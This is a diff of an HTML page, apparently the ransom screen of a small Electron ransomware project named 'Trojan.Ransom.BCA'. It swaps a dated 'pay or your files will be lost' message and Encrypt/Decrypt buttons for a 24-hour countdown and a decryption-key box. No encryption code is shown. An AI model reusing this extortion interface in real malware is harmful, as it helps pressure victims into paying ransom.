@@ -2,56 +2,50 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Hello World!</title>
+    <title>Trojan.Ransom.BCA</title>
     <link rel="stylesheet" href="style.css">
-    <script src="encrypt.js"></script>
 </head>
 <body>
-<h1>Hello World!</h1>
-We are using node <script>document.write(process.versions.node)</script>,
-Chrome <script>document.write(process.versions.chrome)</script>,
-and Electron <script>document.write(process.versions.electron)</script>,
-You have until June 11th, 2018 15:22 to pay or your files will be lost
+<div class="header">
+    <h1>Trojan.Ranson.BCA</h1>
+</div>
 
 <!-- Display the countdown timer in an element -->
-<p id="demo"></p>
+<script type="text/javascript">
+    var count = 86400;
+    var counter = setInterval(timer, 1000);
 
-<script>
-    // Set the date we're counting down to
-    let countDownDate = new Date("June 11, 2018 15:22").getTime();
-
-    // Update the count down every 1 second
-    let x = setInterval(function() {
-
-        // Get todays date and time
-        let now = new Date().getTime();
-
-        // Find the distance between now an the count down date
-        let distance = countDownDate - now;
-
-        // Time calculations for days, hours, minutes and seconds
-        let days = Math.floor(distance / (1000 * 60 * 60 * 24));
-        let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-        let seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-        // Display the result in the element with id="demo"
-        document.getElementById("demo").innerHTML = days + "d " + hours + "h "
-            + minutes + "m " + seconds + "s ";
-
-        // If the count down is finished, write some text
-        if (distance < 0) {
-            clearInterval(x);
+    function timer() {
+        count = count - 1;
+        if (count == -1) {
+            clearInterval(counter);
             document.getElementById("demo").innerHTML = "EXPIRED";
+            return;
         }
-    }, 1000);
-</script>
 
-Enter key here: <input type="text" id="inputKey">
-<button onclick="checkKey()">Submit</button>
-<button onclick="search(0)">Encrypt</button>
-<button onclick="search(1)">Decrypt</button>
-<p id="key"></p>
+        var seconds = count % 60;
+        var minutes = Math.floor(count / 60);
+        var hours = Math.floor(minutes / 60);
+        minutes %= 60;
+        hours %= 60;
+
+        document.getElementById("timer").innerHTML = hours + ":" + minutes + ":" + seconds; // watch for spelling
+    }
+</script>
+<div class='left-div'>
+    <span id='timer'></span>
+</div>
+
+<div class='center-div'>
+    <div class="info-div">
+
+    </div>
+    <div class="down-div">
+        Enter key here: <input type="text" id="inputKey">
+        <button onclick="checkKey()">Submit</button>
+    </div>
+</div>
+
 
 <script>
     function checkKey() {
